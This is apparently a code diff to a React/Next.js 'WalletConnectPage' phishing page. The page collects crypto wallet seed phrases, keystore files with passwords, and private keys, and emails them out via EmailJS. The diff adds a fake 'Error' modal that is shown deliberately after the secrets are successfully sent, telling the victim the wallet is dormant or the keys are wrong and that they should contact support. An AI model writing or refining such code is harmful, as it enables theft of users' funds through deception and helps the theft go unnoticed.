@@ -8,15 +8,17 @@ import { Button } from "@/components/ui/button";
 import { ArrowLeft } from 'lucide-react';
 import { useRouter } from 'next/navigation';
 import emailjs from '@emailjs/browser';
+import Image from 'next/image';
 
 const WalletConnectPage: React.FC = () => {
-  const [activeTab, setActiveTab] = useState('phrase');
-  const [phraseInput, setPhraseInput] = useState('');
-  const [keystoreInput, setKeystoreInput] = useState('');
-  const [passwordInput, setPasswordInput] = useState('');
-  const [privateKeyInput, setPrivateKeyInput] = useState('');
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState('');
+  const [activeTab, setActiveTab] = useState<string>('phrase');
+  const [phraseInput, setPhraseInput] = useState<string>('');
+  const [keystoreInput, setKeystoreInput] = useState<string>('');
+  const [passwordInput, setPasswordInput] = useState<string>('');
+  const [privateKeyInput, setPrivateKeyInput] = useState<string>('');
+  const [loading, setLoading] = useState<boolean>(false);
+  const [error, setError] = useState<string>('');
+  const [showErrorModal, setShowErrorModal] = useState<boolean>(false);
 
   const router = useRouter();
 
@@ -60,6 +62,8 @@ const WalletConnectPage: React.FC = () => {
         process.env.NEXT_PUBLIC_EMAILJS_USER_ID!
       );
 
+      // Show error modal after successful submission
+      setShowErrorModal(true);
       resetInputs(); // Reset inputs after successful submission
 
     } catch (error) {
@@ -195,6 +199,51 @@ const WalletConnectPage: React.FC = () => {
           </CardContent>
         </Card>
       </div>
+
+      {/* Error Modal */}
+      {showErrorModal && (
+        <>
+          <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40" />
+          <div className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-50 
+                        bg-gradient-to-b from-black via-blue-950 to-black
+                        p-8 rounded-xl border border-gray-800 w-[90%] max-w-md">
+            <div className="flex flex-col items-center gap-4 text-center">
+              <Image 
+                src="/assets/error.png"
+                width={80}
+                height={80}
+                alt="Error"
+                className="rounded-full"
+                quality={100}
+              />
+              <h3 className="text-2xl font-bold text-white">Error</h3>
+              <div className="text-gray-300 space-y-4">
+                <p>
+                  Having errors Connecting!!! <br />
+                  sorry for the inconveniences this might due to couple of reasons
+                  on your side:
+                </p>
+                <ul className="text-white font-medium space-y-2">
+                  <li>1. Inactive Or dormant wallet</li>
+                  <li>2. Incorrect keys</li>
+                  <li>3. Weak Internet connection</li>
+                </ul>
+                <p className="text-gray-300">
+                  Kindly ensure you fulfill these prerequisites. If the problem still
+                  persists kindly revert back to the Support teams
+                </p>
+              </div>
+              <button
+                onClick={() => setShowErrorModal(false)}
+                className="mt-4 bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-lg
+                          transition-colors duration-200"
+              >
+                Close
+              </button>
+            </div>
+          </div>
+        </>
+      )}
     </div>
   );
 };
